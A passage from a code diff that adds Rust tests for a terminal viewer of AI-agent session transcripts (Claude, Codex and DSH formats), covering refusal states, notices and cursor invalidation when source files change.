+    let read = read_kind(
+        brokkr_view::transcript::TranscriptKind::DshSession,
+        "seat/a",
+        "/home/operator",
+        None,
+        turns_of(1),
+    );
+    assert!(read.full_session.is_none());
+}
+
+#[test]
+fn rejected_references_keep_their_fact_and_offer_no_door() {
+    for reason in [
+        brokkr_view::transcript::Unavailable::NoReference,
+        brokkr_view::transcript::Unavailable::UnsupportedKind,
+        brokkr_view::transcript::Unavailable::InvalidReference,
+        brokkr_view::transcript::Unavailable::MissingHome,
+        brokkr_view::transcript::Unavailable::AmbiguousSource,
+    ] {
+        let read = refused_read(
+            claude_reference("abcd-1234", "/home/operator/.claude/projects"),
+            reason,
+            brokkr_view::transcript::explanation_for(reason),
+            None,
+            None,
+        );
+        let mut views = views();
+        views.transcript = Some(read);
+        let mut tui = at_transcript(&views);
+        apply(&mut tui, &views, Key::Enter);
+        assert!(tui.reading.is_none(), "{reason:?} opened a door");
+        let frame = frame_of(&tui, &views, 160, 30);
+        assert!(frame.contains("no reading door"), "{reason:?}: {frame}");
+        assert!(!frame.contains("claude --resume"), "{reason:?}: {frame}");
+    }
+}
+
+#[test]
+fn the_three_claude_lookup_refusals_keep_the_claude_hint() {
+    let hint = "full session: claude --resume abcd-1234";
+    for reason in [
+        brokkr_view::transcript::Unavailable::AmbiguousSource,
+        brokkr_view::transcript::Unavailable::DiscoveryLimit,
+        brokkr_view::transcript::Unavailable::UnsafePath,
+    ] {
+        let read = refused_read(
+            claude_reference("abcd-1234", "/home/operator/.claude/projects"),
+            reason,
+            brokkr_view::transcript::explanation_for(reason),
+            None,
+            Some(hint),
+        );
+        let mut views = views();
+        views.transcript = Some(read);
+        let mut tui = at_transcript(&views);
+        let frame = frame_of(&tui, &views, 200, 34);
+        assert!(frame.contains(reason.as_str()), "{reason:?}: {frame}");
+        assert!(frame.contains(hint), "{reason:?}: {frame}");
+        apply(&mut tui, &views, Key::Enter);
+        assert!(tui.reading.is_none(), "{reason:?} opened a door");
+    }
+}
+
+#[test]
+fn the_shared_truncation_notice_is_identical_for_claude_and_codex() {
+    for (kind, locator) in [
+        (
+            brokkr_view::transcript::TranscriptKind::ClaudeSession,
+            "abcd-1234",
+        ),
+        (
+            brokkr_view::transcript::TranscriptKind::CodexThread,
+            "0199mine",
+        ),
+    ] {
+        let mut read = read_kind(
+            kind,
+            locator,
+            "/home/operator",
+            Some("/home/operator/confirmed.jsonl"),
+            turns_of(2),
+        );
+        read.truncated = true;
+        read.notices = brokkr_view::transcript::notices(true, 0, 0);
+        let mut views = views();
+        views.transcript = Some(read);
+        let mut tui = at_transcript(&views);
+        let frame = frame_of(&tui, &views, 140, 34);
+        assert!(frame.contains("transcript truncated (size cap)"), "{frame}");
+        assert!(!frame.contains("carries the rest"), "{frame}");
+
+        apply(&mut tui, &views, Key::Down);
+        apply(&mut tui, &views, Key::Enter);
+        let one = tui.reading.clone().expect("the selected turn opens");
+        assert!(one.contains("transcript truncated (size cap)"), "{one}");
+        assert!(!one.contains("carries the rest"), "{one}");
+
+        apply(&mut tui, &views, Key::Escape);
+        apply(&mut tui, &views, Key::Escape);
+        apply(&mut tui, &views, Key::Enter);
+        let all = tui.reading.clone().expect("the whole door opens");
+        assert!(all.contains("transcript truncated (size cap)"), "{all}");
+        assert!(!all.contains("carries the rest"), "{all}");
+    }
+}
+
+#[test]
+fn the_unknown_record_notice_reaches_the_pane_and_both_doors() {
+    let mut read = read_of(turns_of(1), false);
+    read.unrecognized_records = 3;
+    read.notices = brokkr_view::transcript::notices(false, 0, 3);
+    let mut views = views();
+    views.transcript = Some(read);
+    let mut tui = at_transcript(&views);
+    let frame = frame_of(&tui, &views, 140, 30);
+    assert!(
+        frame.contains("unrecognized transcript records: 3"),
+        "{frame}"
+    );
+
+    apply(&mut tui, &views, Key::Down);
+    apply(&mut tui, &views, Key::Enter);
+    let one = tui.reading.clone().expect("the selected turn opens");
+    assert!(one.contains("unrecognized transcript records: 3"), "{one}");
+
+    apply(&mut tui, &views, Key::Escape);
+    apply(&mut tui, &views, Key::Escape);
+    apply(&mut tui, &views, Key::Enter);
+    let all = tui.reading.clone().expect("the whole door opens");
+    assert!(all.contains("unrecognized transcript records: 3"), "{all}");
+}
+
+/// M6: a notice-only refresh leaves the turns alone but must recompose an
+/// open transcript door, so the pane and the door always report the same
+/// snapshot. This drives the real `drive` transition, not `apply` alone.
+#[test]
+fn a_notice_only_refresh_recomposes_the_open_transcript_door() {
+    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
+    let saved = std::panic::take_hook();
+    let mut terminal = Terminal::new(TestBackend::new(140, 30)).unwrap();
+
+    let mut first = views();
+    let mut first_read = read_of(turns_of(2), false);
+    first_read.notices = vec!["first notice".to_string()];
+    first.transcript = Some(first_read);
+
+    let mut second = views();
+    let mut second_read = read_of(turns_of(2), false);
+    second_read.notices = vec!["second notice".to_string()];
+    second.transcript = Some(second_read);
+
+    script(&[Key::Enter, Key::Quit]);
+    let mut tui = at_transcript(&first);
+    let mut answers: Vec<Option<Views>> = vec![Some(first), Some(second)];
+    let mut source = move |_: Ask| {
+        if answers.is_empty() {
+            return Ok(None);
+        }
+        Ok(answers.remove(0))
+    };
+    drive(&mut terminal, &test_ops(), &mut source, &mut tui, 4).unwrap();
+    let reading = tui.reading.expect("the door stays open across the refresh");
+    assert!(
+        reading.contains("second notice"),
+        "the door carries the fresh notice: {reading}"
+    );
+    assert!(
+        !reading.contains("first notice"),
+        "the stale notice is gone: {reading}"
+    );
+    std::panic::set_hook(saved);
+}
+
+#[test]
+fn an_oversized_first_turn_keeps_its_capped_explanation_openable() {
+    let mut views = views();
+    views.transcript = Some(read_of(Vec::new(), true));
+    let mut tui = at_transcript(&views);
+    let frame = frame_of(&tui, &views, 140, 30);
+    assert!(
+        frame.contains("no readable turns — transcript truncated (size cap)"),
+        "{frame}"
+    );
+    assert!(frame.contains("transcript truncated (size cap)"), "{frame}");
+    apply(&mut tui, &views, Key::Enter);
+    let all = tui.reading.clone().expect("the explanation opens");
+    assert!(
+        all.contains("no readable turns — transcript truncated (size cap)"),
+        "{all}"
+    );
+    assert!(
+        all.contains("full session: claude --resume abcd-1234"),
+        "{all}"
+    );
+    assert!(!all.contains("missing"), "{all}");
+}
+
+#[test]
+fn a_boxed_codex_hint_is_inert_data_and_starts_no_process() {
+    let read = read_kind(
+        brokkr_view::transcript::TranscriptKind::CodexThread,
+        "0199mine",
+        "/home/operator/.codex",
+        Some("/home/operator/.codex/sessions/rollout-0199mine.jsonl"),
+        turns_of(1),
+    );
+    let hint = read.full_session.clone().unwrap();
+    let mut views = views();
+    views.transcript = Some(read);
+    let mut tui = at_transcript(&views);
+    apply(&mut tui, &views, Key::Enter);
+    let all = tui.reading.clone().expect("the whole door opens");
+    assert!(all.contains(&hint), "{all}");
+    // The hint is a rendered string and nothing else: the TUI names no
+    // process spawn anywhere.
+    assert!(!include_str!("../tui.rs").contains("Command::new"));
+}
+
+#[test]
+fn a_valid_65_to_80_character_codex_id_resolves_without_a_claude_guard() {
+    let dir = tempfile::tempdir().unwrap();
+    let home = dir.path().to_string_lossy().to_string();
+    let sessions = dir.path().join("sessions");
+    std::fs::create_dir_all(&sessions).unwrap();
+    for length in [65usize, 80] {
+        let id = "a".repeat(length);
+        std::fs::write(
+            sessions.join(format!("rollout-{id}.jsonl")),
+            codex_message("assistant", "the ruling"),
+        )
+        .unwrap();
+        let read = crate::ui::read_local(
+            Some(&brokkr_view::Transcript {
+                kind: "codex-thread".to_string(),
+                locator: id.clone(),
+                home: home.clone(),
+            }),
+            LegacyProvenance::Other,
+            None,
+        );
+        assert!(read.is_readable(), "{length}: {:?}", read.unavailable);
+        assert_eq!(read.turns.len(), 1, "{length}");
+        assert!(
+            read.path
+                .as_deref()
+                .is_some_and(|path| path.ends_with(&format!("rollout-{id}.jsonl"))),
+            "{length}: {:?}",
+            read.path
+        );
+    }
+}
+
+#[test]
+fn the_shipped_claude_fixture_counts_survive_selection() {
+    let dir = tempfile::tempdir().unwrap();
+    let projects = dir.path().to_string_lossy().to_string();
+    let real = dir.path().join("real-project");
+    std::fs::create_dir_all(&real).unwrap();
+    let transcript = concat!(
+        "not json\n",
+        "{\"type\":\"summary\"}\n",
+        "{\"type\":\"user\"}\n",
+        "{\"type\":\"assistant\",\"message\":{\"role\":\"assistant\",",
+        "\"content\":\"the plain form\"},\"timestamp\":\"2026-01-01T00:00:00Z\"}\n",
+        "{\"type\":\"user\",\"message\":{\"content\":[",
+        "{\"type\":\"text\",\"text\":\"what happened\"},",
+        "{\"type\":\"text\",\"text\":\"   \"},",
+        "{\"type\":\"text\"},",
+        "{\"type\":\"tool_use\",\"name\":\"Read\",\"input\":{\"file_path\":\"src/lib.rs\"}},",
+        "{\"type\":\"tool_use\",\"name\":\"Bash\"},",
+        "{\"type\":\"thinking\"}]}}\n",
+    );
+    std::fs::write(real.join("abcd-1234.jsonl"), transcript).unwrap();
+
+    let read = crate::ui::read_local(
+        Some(&claude_reference("abcd-1234", &projects)),
+        LegacyProvenance::Claude,
+        None,
+    );
+    assert!(read.is_readable(), "{:?}", read.unavailable);
+    assert_eq!(read.turns.len(), 2);
+    assert_eq!(read.skipped_lines, 1);
+    assert_eq!(read.unrecognized_records, 0);
+    assert!(!read.truncated);
+    assert_eq!(read.notices, vec!["malformed transcript lines skipped: 1"]);
+
+    let mut views = views();
+    views.transcript = Some(read);
+    let mut tui = at_transcript(&views);
+    let frame = frame_of(&tui, &views, 140, 34);
+    assert!(
+        frame.contains("malformed transcript lines skipped: 1"),
+        "{frame}"
+    );
+    assert!(
+        !frame.contains("unrecognized transcript records"),
+        "{frame}"
+    );
+    apply(&mut tui, &views, Key::Down);
+    apply(&mut tui, &views, Key::Char('j'));
+    apply(&mut tui, &views, Key::Enter);
+    let one = tui.reading.clone().expect("the second turn opens");
+    assert!(
+        one.contains("malformed transcript lines skipped: 1"),
+        "{one}"
+    );
+    apply(&mut tui, &views, Key::Escape);
+    apply(&mut tui, &views, Key::Escape);
+    apply(&mut tui, &views, Key::Enter);
+    let all = tui.reading.clone().expect("the whole door opens");
+    assert!(
+        all.contains("malformed transcript lines skipped: 1"),
+        "{all}"
+    );
+}
+
+#[test]
+fn a_late_codex_rollout_appears_without_a_journal_move() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let sessions = dir.path().join("sessions");
+    std::fs::create_dir_all(&sessions).unwrap();
+    let mut head = None;
+    let mut seen = None;
+    let first = refresh_subject(
+        &db,
+        subject_of_kind("codex-thread", "0199mine", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .expect("the first frame is forced");
+    assert_eq!(
+        first.transcript.as_ref().unwrap().unavailable,
+        Some(brokkr_view::transcript::Unavailable::NotFound)
+    );
+    assert!(refresh_subject(
+        &db,
+        subject_of_kind("codex-thread", "0199mine", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .is_none());
+
+    std::fs::write(
+        sessions.join("rollout-0199mine.jsonl"),
+        codex_message("assistant", "the ruling"),
+    )
+    .unwrap();
+    let fresh = refresh_subject(
+        &db,
+        subject_of_kind("codex-thread", "0199mine", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .expect("the late rollout reaches the operator without a journal move");
+    let read = fresh.transcript.unwrap();
+    assert!(read.is_readable());
+    assert_eq!(read.turns.len(), 1);
+}
+
+#[test]
+fn a_dsh_assembled_message_appended_between_checkpoints_keeps_the_prefix() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let file = dir
+        .path()
+        .join("seat")
+        .join("p")
+        .join("s")
+        .join("session.jsonl");
+    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+    std::fs::write(&file, format!("{DSH_HEADER_V0}{}", dsh_user("hello", 1))).unwrap();
+    let mut head = None;
+    let mut seen = None;
+    let first = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap();
+    let old = first.transcript.unwrap();
+    assert!(old.is_readable());
+    assert_eq!(old.turns.len(), 1);
+
+    std::fs::write(
+        &file,
+        format!(
+            "{DSH_HEADER_V0}{}{}",
+            dsh_user("hello", 1),
+            dsh_assistant("the ruling", 2)
+        ),
+    )
+    .unwrap();
+    let fresh = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap();
+    let new = fresh.transcript.unwrap();
+    assert_eq!(new.turns.len(), 2, "source order preserved");
+    assert!(
+        !transcript_invalidates(Some(&old), Some(&new)),
+        "a pure append keeps navigation"
+    );
+}
+
+#[test]
+fn an_appended_required_unknown_dsh_event_clears_both_doors() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let file = dir
+        .path()
+        .join("seat")
+        .join("p")
+        .join("s")
+        .join("session.jsonl");
+    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+    std::fs::write(&file, format!("{DSH_HEADER_V0}{}", dsh_user("hello", 1))).unwrap();
+    let mut head = None;
+    let mut seen = None;
+    let first = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap();
+    let readable = first.transcript.clone().unwrap();
+    assert!(readable.is_readable());
+
+    std::fs::write(
+        &file,
+        format!(
+            "{DSH_HEADER_V0}{}{{\"type\":\"future/event\",\"data\":{{}}}}\n",
+            dsh_user("hello", 1)
+        ),
+    )
+    .unwrap();
+    let fresh = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .expect("the refusal is a new frame");
+    let refused = fresh.transcript.unwrap();
+    assert_eq!(
+        refused.unavailable,
+        Some(brokkr_view::transcript::Unavailable::UnsupportedFormat)
+    );
+    assert!(refused.turns.is_empty());
+    assert!(transcript_invalidates(Some(&readable), Some(&refused)));
+
+    let mut views = views();
+    views.transcript = Some(refused);
+    let mut tui = at_transcript(&views);
+    apply(&mut tui, &views, Key::Enter);
+    assert!(tui.reading.is_none(), "the old door must not reopen");
+}
+
+#[test]
+fn an_appended_ignorable_dsh_event_keeps_turns_and_raises_the_count() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let file = dir
+        .path()
+        .join("seat")
+        .join("p")
+        .join("s")
+        .join("session.jsonl");
+    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+    std::fs::write(&file, format!("{DSH_HEADER_V0}{}", dsh_user("hello", 1))).unwrap();
+    let mut head = None;
+    let mut seen = None;
+    let first = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap();
+    let old = first.transcript.unwrap();
+
+    std::fs::write(
+        &file,
+        format!(
+            "{DSH_HEADER_V0}{}{{\"type\":\"future/event\",\"ignorable\":true}}\n",
+            dsh_user("hello", 1)
+        ),
+    )
+    .unwrap();
+    let fresh = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap();
+    let new = fresh.transcript.unwrap();
+    assert!(new.is_readable(), "{:?}", new.unavailable);
+    assert_eq!(new.turns.len(), 1, "recognized turns survive");
+    assert_eq!(new.unrecognized_records, 1);
+    assert!(new
+        .notices
+        .iter()
+        .any(|notice| notice == "unrecognized transcript records: 1"));
+    assert!(!transcript_invalidates(Some(&old), Some(&new)));
+}
+
+#[test]
+fn a_same_length_dsh_version_rewrite_refuses_and_later_recovers() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let file = dir
+        .path()
+        .join("seat")
+        .join("p")
+        .join("s")
+        .join("session.jsonl");
+    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+    let v0 = format!("{DSH_HEADER_V0}{}", dsh_user("hello", 1));
+    let v1 = v0.replace("version\":0", "version\":1");
+    assert_eq!(v0.len(), v1.len(), "the rewrite changes no file length");
+
+    std::fs::write(&file, &v0).unwrap();
+    let mut head = None;
+    let mut seen = None;
+    let first = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap();
+    assert!(first.transcript.unwrap().is_readable());
+
+    std::fs::write(&file, &v1).unwrap();
+    let refused = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .expect("the same-length rewrite is a new frame")
+    .transcript
+    .unwrap();
+    assert_eq!(
+        refused.unavailable,
+        Some(brokkr_view::transcript::Unavailable::UnsupportedFormat)
+    );
+    assert_eq!(refused.skipped_lines, 0);
+    assert_eq!(refused.unrecognized_records, 0);
+    assert_eq!(refused.notices, Vec::<String>::new());
+
+    std::fs::write(&file, &v0).unwrap();
+    let recovered = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .expect("a restored version-zero snapshot recovers")
+    .transcript
+    .unwrap();
+    assert!(recovered.is_readable());
+    assert_eq!(recovered.turns.len(), 1);
+}
+
+#[test]
+fn a_second_foreign_version_dsh_root_produces_ambiguity() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let readable = dir
+        .path()
+        .join("seat")
+        .join("p")
+        .join("s")
+        .join("session.jsonl");
+    let foreign = dir
+        .path()
+        .join("seat")
+        .join("p")
+        .join("other")
+        .join("session.jsonl");
+    std::fs::create_dir_all(readable.parent().unwrap()).unwrap();
+    std::fs::create_dir_all(foreign.parent().unwrap()).unwrap();
+    std::fs::write(
+        &readable,
+        format!("{DSH_HEADER_V0}{}", dsh_user("hello", 1)),
+    )
+    .unwrap();
+    std::fs::write(
+        &foreign,
+        format!(
+            "{}{}",
+            "{\"type\":\"session\",\"version\":1}\n",
+            dsh_user("other", 1)
+        ),
+    )
+    .unwrap();
+
+    let mut head = None;
+    let mut seen = None;
+    let read = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap()
+    .transcript
+    .unwrap();
+    assert_eq!(
+        read.unavailable,
+        Some(brokkr_view::transcript::Unavailable::AmbiguousSource)
+    );
+    assert!(read.turns.is_empty());
+    assert!(read.path.is_none());
+    assert!(read.full_session.is_none());
+}
+
+#[test]
+fn replacement_shrink_and_disappearance_invalidate_the_turn_cursor() {
+    let three = read_of(turns_of(3), false);
+    let two = read_of(turns_of(2), false);
+    let appended = read_of(turns_of(4), false);
+    let reordered = read_of(
+        vec![text_turn("assistant", "other"), text_turn("user", "a")],
+        false,
+    );
+    let mut refused = read_of(Vec::new(), false);
+    refused.unavailable = Some(brokkr_view::transcript::Unavailable::UnsupportedFormat);
+    refused.notices = vec!["transcript truncated (size cap)".to_string()];
+
+    assert!(transcript_invalidates(Some(&three), Some(&two)), "shrink");
+    assert!(
+        transcript_invalidates(Some(&two), Some(&reordered)),
+        "reorder/replacement"
+    );
+    assert!(
+        transcript_invalidates(Some(&three), Some(&refused)),
+        "format refusal"
+    );
+    assert!(
+        !transcript_invalidates(Some(&three), Some(&appended)),
+        "a pure append keeps navigation"
+    );
+    assert!(
+        transcript_invalidates(Some(&three), None),
+        "disappearance clears"
+    );
+}
+
+/// M11: a same-content replacement carries a different source identity,
+/// so it invalidates the cursor/overlay even when every turn, path and
+/// count is identical.
+#[test]
+fn a_same_content_source_replacement_invalidates_identical_turns() {
+    let mut old = read_of(turns_of(2), false);
+    old.source_identity = Some(brokkr_view::transcript::SourceIdentity {
+        device: 1,
+        inode: 10,
+    });
+    let mut replaced = read_of(turns_of(2), false);
+    replaced.source_identity = Some(brokkr_view::transcript::SourceIdentity {
+        device: 1,
+        inode: 11,
+    });
+    assert_eq!(old.turns, replaced.turns);
+    assert_eq!(old.path, replaced.path);
+    assert!(
+        transcript_invalidates(Some(&old), Some(&replaced)),
+        "a new inode after a same-content replacement invalidates"
+    );
+
+    let mut same = read_of(turns_of(2), false);
+    same.source_identity = Some(brokkr_view::transcript::SourceIdentity {
+        device: 1,
+        inode: 10,
+    });
+    assert!(
+        !transcript_invalidates(Some(&old), Some(&same)),
+        "the same source identity keeps navigation"
+    );
+}
+
+fn dsh_chunk(text: &str, seq: i64, turn: i64, step: i64) -> String {
+    format!(
+        "{{\"type\":\"assistant/chunk\",\"data\":{{\"chunk\":{{\"type\":\"text-delta\",\"text\":\"{text}\"}},\"turn\":{turn},\"step\":{step}}},\"seq\":{seq},\"time\":1000}}\n"
+    )
+}
+
+/// A DSH source: header, the given chunks, then the given assemblies.
+/// Every row is a complete physical line, so a test can append between
+/// refreshes.
+fn dsh_citation_file(chunks: &[(i64, &str)], assemblies: &[(i64, &str, &str)]) -> String {
+    let mut body = String::from(DSH_HEADER_V0);
+    for (seq, text) in chunks {
+        body.push_str(&dsh_chunk(text, *seq, 1, 1));
+    }
+    for (seq, text, citations) in assemblies {
+        body.push_str(&format!(
+            "{{\"type\":\"assistant/message\",\"data\":{{\"message\":{{\"content\":\"{text}\"}},\"turn\":1,\"step\":1}},\"sourceEventSeqs\":{citations},\"seq\":{seq},\"time\":2000}}\n"
+        ));
+    }
+    body
+}
+
+#[test]
+fn chunks_replaced_by_their_citing_assembly_clear_selection_and_overlay() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let file = dir
+        .path()
+        .join("seat")
+        .join("p")
+        .join("s")
+        .join("session.jsonl");
+    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+    std::fs::write(&file, dsh_citation_file(&[(10, "a"), (11, "b")], &[])).unwrap();
+    let mut head = None;
+    let mut seen = None;
+    let first = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap();
+    let old = first.transcript.unwrap();
+    assert_eq!(old.turns.len(), 2, "the two chunks are provisional turns");
+    let mut views = views();
+    views.transcript = Some(old.clone());
+    let mut tui = at_transcript(&views);
+    apply(&mut tui, &views, Key::Down);
+    apply(&mut tui, &views, Key::Enter);
+    assert!(tui.reading.is_some(), "a chunk door is open");
+
+    std::fs::write(
+        &file,
+        dsh_citation_file(&[(10, "a"), (11, "b")], &[(12, "ab", "[[10,11]]")]),
+    )
+    .unwrap();
+    let fresh = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .expect("the assembly replaces the chunks");
+    let new = fresh.transcript.unwrap();
+    assert!(new.is_readable(), "{:?}", new.unavailable);
+    assert_eq!(new.turns.len(), 1, "the assembly replaces both chunks");
+    assert!(transcript_invalidates(Some(&old), Some(&new)));
+}
+
+#[test]
+fn a_ranged_partial_assembly_keeps_the_uncited_chunk() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let file = dir
+        .path()
+        .join("seat")
+        .join("p")
+        .join("s")
+        .join("session.jsonl");
+    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+    let chunks = [(10, "a"), (11, "b"), (12, "c"), (14, "d")];
+    std::fs::write(&file, dsh_citation_file(&chunks, &[])).unwrap();
+    let mut head = None;
+    let mut seen = None;
+    let old = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap()
+    .transcript
+    .unwrap();
+    assert_eq!(old.turns.len(), 4);
+
+    std::fs::write(
+        &file,
+        dsh_citation_file(&chunks, &[(15, "abc", "[[10,12]]")]),
+    )
+    .unwrap();
+    let new = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap()
+    .transcript
+    .unwrap();
+    assert_eq!(new.turns.len(), 2, "chunk 14 then the assembly");
+    assert!(
+        new.turns[0].blocks[0].text.contains('d'),
+        "{:?}",
+        new.turns[0]
+    );
+    assert!(
+        new.turns[1].blocks[0].text.contains("abc"),
+        "{:?}",
+        new.turns[1]
+    );
+    assert!(transcript_invalidates(Some(&old), Some(&new)));
+}
+
+#[test]
+fn an_absent_citation_leaves_fragments_and_preserves_the_prior_selection() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let file = dir
+        .path()
+        .join("seat")
+        .join("p")
+        .join("s")
+        .join("session.jsonl");
+    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+    let chunks = [(10, "a"), (11, "b")];
+    std::fs::write(&file, dsh_citation_file(&chunks, &[])).unwrap();
+    let mut head = None;
+    let mut seen = None;
+    let old = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap()
+    .transcript
+    .unwrap();
+    assert_eq!(old.turns.len(), 2);
+
+    // An assembly with no `sourceEventSeqs` field suppresses nothing: the
+    // two fragments stay at their own positions and the assembly follows.
+    std::fs::write(
+        &file,
+        format!(
+            "{}{}",
+            dsh_citation_file(&chunks, &[]),
+            "{\"type\":\"assistant/message\",\"data\":{\"message\":{\"content\":\"c\"},\"turn\":1,\"step\":1},\"seq\":12,\"time\":2000}\n"
+        ),
+    )
+    .unwrap();
+    let new = refresh_subject(
+        &db,
+        subject_of_kind("dsh-session", "seat", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap()
+    .transcript
+    .unwrap();
+    assert_eq!(new.turns.len(), 3, "both fragments and the assembly");
+    assert!(
+        !transcript_invalidates(Some(&old), Some(&new)),
+        "an absent citation is a pure append"
+    );
+}
+
+#[test]
+fn a_refused_capped_snapshot_cannot_reopen_the_empty_explanation() {
+    // A refusal is not a readable zero-turn result even when it carries a
+    // source-cap notice and positive counts; Enter must not open the
+    // reserved "no readable turns" explanation or a former snapshot.
+    let mut read = refused_read(
+        claude_reference("abcd-1234", "/home/operator/.claude/projects"),
+        brokkr_view::transcript::Unavailable::UnsupportedFormat,
+        "DSH transcript format is not supported",
+        Some("/home/operator/seat/session.jsonl"),
+        None,
+    );
+    read.truncated = true;
+    read.skipped_lines = 2;
+    read.unrecognized_records = 2;
+    read.notices = brokkr_view::transcript::notices(true, 2, 2);
+    let mut views = views();
+    views.transcript = Some(read);
+    let mut tui = at_transcript(&views);
+    apply(&mut tui, &views, Key::Enter);
+    assert!(tui.reading.is_none(), "a refusal has no door");
+    let frame = frame_of(&tui, &views, 160, 34);
+    assert!(frame.contains("unsupported-format"), "{frame}");
+    assert!(
+        frame.contains("DSH transcript format is not supported"),
+        "{frame}"
+    );
+    assert!(frame.contains("transcript truncated (size cap)"), "{frame}");
+    assert!(
+        frame.contains("skipped 2 · unrecognized 2"),
+        "the refused snapshot keeps its counts: {frame}"
+    );
+    assert!(
+        !frame.contains("no readable turns — transcript truncated"),
+        "the readable-empty explanation must not appear: {frame}"
+    );
+}
+
+#[test]
+fn a_codex_canonical_arrival_replaces_only_its_associated_fallback() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("forge.db");
+    crate::tests::running_store(&db, "run-7");
+    let home = dir.path().to_string_lossy().to_string();
+    let sessions = dir.path().join("sessions");
+    std::fs::create_dir_all(&sessions).unwrap();
+    let file = sessions.join("rollout-0199mine.jsonl");
+    let fallback = "{\"timestamp\":\"2026-01-01T00:00:01Z\",\"type\":\"event_msg\",\"payload\":{\"type\":\"item_completed\",\"item\":{\"type\":\"AgentMessage\",\"id\":\"m1\",\"content\":\"the ruling\"}}}\n";
+    let unrelated = "{\"timestamp\":\"2026-01-01T00:00:02Z\",\"type\":\"event_msg\",\"payload\":{\"type\":\"agent_message\",\"message\":\"another event\"}}\n";
+    std::fs::write(&file, format!("{fallback}{unrelated}")).unwrap();
+    let mut head = None;
+    let mut seen = None;
+    let old = refresh_subject(
+        &db,
+        subject_of_kind("codex-thread", "0199mine", &home, true),
+        true,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap()
+    .transcript
+    .unwrap();
+    assert_eq!(old.turns.len(), 2, "the fallback and the unrelated event");
+
+    // The canonical item arrives later and removes only the fallback
+    // block; the unrelated event survives at its own position.
+    let canonical = "{\"timestamp\":\"2026-01-01T00:00:03Z\",\"type\":\"response_item\",\"payload\":{\"type\":\"message\",\"role\":\"assistant\",\"id\":\"m1\",\"content\":[{\"type\":\"output_text\",\"text\":\"the ruling\"}]}}\n";
+    std::fs::write(&file, format!("{fallback}{unrelated}{canonical}")).unwrap();
+    let new = refresh_subject(
+        &db,
+        subject_of_kind("codex-thread", "0199mine", &home, true),
+        false,
+        &mut head,
+        &mut seen,
+    )
+    .unwrap()
+    .transcript
+    .unwrap();
+    assert_eq!(new.turns.len(), 2, "{:?}", new.turns);
